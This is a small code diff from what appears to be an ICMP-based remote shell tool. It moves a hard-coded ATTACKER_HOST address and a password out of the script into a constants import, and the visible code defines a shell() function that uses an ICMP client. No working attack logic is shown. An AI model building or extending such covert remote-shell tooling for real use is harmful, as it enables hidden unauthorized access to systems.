@@ -3,10 +3,7 @@
 
 import os, sys, socket, struct, select, time, string, argparse, subprocess
 from icmpclient import Icmpclient
-
-## CONFIG
-ATTACKER_HOST = "192.168.1.164"
-PASSWORD = "123mudar"
+from const import *
 
 def shell(client):
     cmd = ""
